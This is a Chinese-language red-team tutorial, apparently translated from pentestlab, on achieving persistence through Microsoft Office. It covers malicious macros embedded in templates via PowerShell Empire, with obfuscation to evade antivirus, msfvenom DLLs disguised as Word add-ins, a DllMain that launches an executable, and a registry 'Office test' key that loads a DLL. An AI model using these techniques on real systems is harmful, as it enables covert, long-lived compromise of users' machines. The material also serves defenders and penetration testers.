> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SZPmGDfDIpK3fP5nlHUcMA)

[![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfcKMst8DIrjHAe2Ntwl8LP3l3ja18BQ8Ece5ru3qV9TEEYiavuJvgzAgu9sXB5QXgVk83E1MgcJbSA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247494477&idx=1&sn=455f152637b474c0895388fa7120f9ec&chksm=ec1ddb65db6a527347fb2ba24d96fea3aa01b493ec777ffecc94999dbc8d47e974aea7e09239&scene=21#wechat_redirect)

Microsoft Office 是 Windows 操作系统中使用最多的产品，用来完成每日的工作，比如 HR 筛选简历、销售人员编写标书、汇报工作编写演示文稿等。如何利用 Office 软件的功能实现权限持久化呢？

### Office 模板

对于企业而言，都喜欢使用统一的模板文件，在每次启动 Office 软件时加载模板，模板文件存储在下面的位置：

> C:\Users\pentestlab\AppData\Roaming\Microsoft\Templates

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmW7M3pUX0lbWZThzpQZmnsQ73iaqAwLZrNHW90h1ibBx7nicMibsuw24ZpQ/640?wx_fmt=png)

如果恶意宏嵌入到基础模板中，用户在每次启动 Office 软件时，都执行一下恶意的宏代码，可以使用 PowerShell Empire 中的模块生成宏代码：

> usestager windows/macro set Listener http execute

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmaEdlrJ6aCgdlB7qIFxZG2htibbD9OyRWwU9hJcgp0bzHOwXN2eoXDHQ/640?wx_fmt=png)

生成的宏可以直接插入到模板文档中，对代码进行混淆可以绕过一些防病毒的检测：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmcsvJqU0KREibGVv4o5RHyCLWDs6uOgkqVMdxnoQqDdQiaZH38yznuIMg/640?wx_fmt=png)

当用户打开模板文件时，执行 Office 宏代码，可以看到目标连接的 Session：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOm2DmSJdookvOwMynR04EUpHJGMShQaCEFEuLbK3xDIiaKp9wx2lfq2mg/640?wx_fmt=png)

### 外部插件

Office 外部插件用于扩展 Office 程序的功能。当 Office 应用程序启动时，会对存储外部插件的文件夹进行检查，以便应用程序加载它们。执行以下命令来发现 Microsoft Word 的可信位置，也可以删除外部插件。

> Get-ChildItem "hkcu:\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations"

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmVibMdDxjWFoYhkUdalfCicMbtiaaXmXocXBz3Elan9jfrpzlbNrPib3mGQ/640?wx_fmt=png)

Office 的外部插件是 DLL 文件，扩展名不同，表示使用不同的应用程序，例如 **.wll** 代表 Word，**.xll** 代表 Excel。Metasploit Framework 的 “msfvenom” 可用于创建可被使用的 DLL 文件，然后将扩展名修改为“**.wll**”（Word 插件程序的扩展名），并将文件移动到 Word 启动文件夹，每次 Word 启动时执行外部插件：

> C:\Users\Admin\AppData\Roaming\Microsoft\Word\STARTUP

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmo0pbBAp1VEhpUgZf9uaIIPvVMlY4mV1GMJ3DoGut9hvvKDFsMVOmQg/640?wx_fmt=png)

代码执行后，meterpreter 会得到一个回连 Session，但是 word 会崩溃，这对于用户来说能够知道，Word 可能被人破坏或者修改，容易引起用户的警觉：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmsM5jxOCB3OUf78Q3zhwcdGYOJxMoDSqx0hdrsRo5GFOJrfic3sA0TAg/640?wx_fmt=png)

最好的方法是创建一个不会导致应用程序崩溃的自定义 DLL 文件

**DLL_PROCESS_ATTACH** 可以把 DLL 加载到当前进程的虚拟地址空间（Word、Excel、PowerPoint 等），DLL 一旦被加载，就可以启动任意可执行的文件：

```
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdlib.h>
 
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("start pentestlab32.exe");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmWXVibYEhsia8GUibQsnnc5TYzyfhbawWg0AVpYsGKbibVScBQUQMHxI8QA/640?wx_fmt=png)

Word Add-Ins 具有 “**.wll**” 文件的扩展名，本质上是放置在 Word 启动文件夹中的 DLL 文件，每次 Microsoft Word 启动时都会加载：

> C:\Users\Admin\AppData\Roaming\Microsoft\Word\STARTUP

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmtTaOmRHlPMGDmfpH63Q4968E5SztBtJURLYroSa4reFj9zibFoxrLHw/640?wx_fmt=png)

下次 Word 启动时，将加载加载 DLL 程序，并执行恶意文件：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOm90KUpYcVVttSbqkk7yBcYCkUuwB8JyMynuFHaqibsHaaWOKPcIibo3og/640?wx_fmt=png)

还有个 Powershell 版本的脚本，可以生成相关文件（WLL、XLL、VBA）。并将这些文件复制到 Word、Excel 或 PowerPoint 的启动文件夹中：

下载地址：

> https://github.com/3gstudent/Office-Persistence

使用方法：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmiaFm5DZ1nH7OVpNCTiaoYAw0Mu1ibYYdabbYydo43qMRkDDVJfVFxtImw/640?wx_fmt=png)

默认情况下，脚本生成的程序主要是用来弹出计算器，用户验证持久化的能力：

```
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Word\Startup\calc.wll",$fileContentBytes)
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOm37jia95nX00vbImeurjOBFmk7OCI4k8yrsCR8MibIOQl6QfBgdWaeRcA/640?wx_fmt=png)

### Office test

在注册表中创建一个注册表项，在 Office 软件启动时，会自动加载该注册表项中指定的 DLL 文件，创建命令如下：

> reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\tmp\pentestlab.dll

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOm9iabgdr1icvy01SlvFzIOZPZ53FYseiaIJTI9jESqIpc6YjcO31mF3fDg/640?wx_fmt=png)

该命令将创建以下注册表结构：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmOZd8Qt86KQc0BVF4ibev6vcZRoVExfnhQTLFpVAW5QK4xJcPUk2s51g/640?wx_fmt=png)

当 Microsoft Office 应用程序再次启动时，DLL 被执行：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfc0DRmiam9Y14gOlKET11TOmqxkBSG9mKLGsh3Lr2If3Z1icgz8ibGhKGRZFQUVmVXyfyh9ok16JcIgQ/640?wx_fmt=png)

### 参考文献

https://attack.mitre.org/techniques/T1137/

https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/

https://github.com/3gstudent/Office-Persistence

https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/

https://github.com/Pepitoh/VBad

https://github.com/outflanknl/EvilClippy

https://github.com/christophetd/spoofing-office-macro

https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/

https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/

http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/

https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique

https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/

https://github.com/enigma0x3/Generate-Macro

https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/

https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/

https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/

### 原文链接

> 文章翻译来源：pentestlab
> 
> 链接：https://pentestlab.blog/2019/12/11/persistence-office-application-startup/

 ![](http://wx.qlogo.cn/finderhead/Q3auHgzwzM52neibQP42rLoUiaPOuaLeiaKmgd9W4LBC9OwGCjk3rYI7g/0) **信安之路** 信安之路成长平台通过任务驱动学习信息安全技术，完成任务之后横向扩展学习他人经验，形成闭环，逐步提升，主要方向分为 web 安全、红队技术和脚本开发  公众号

![](https://mmbiz.qpic.cn/mmbiz_gif/sGfPWsuKAfeYwjJqZiawVOoPhFXUqypbLIMib9dGbe001zcXZuSsaIBqulE92WQKq1YGOv7POdTUux9yNZe0e3dA/640?wx_fmt=gif)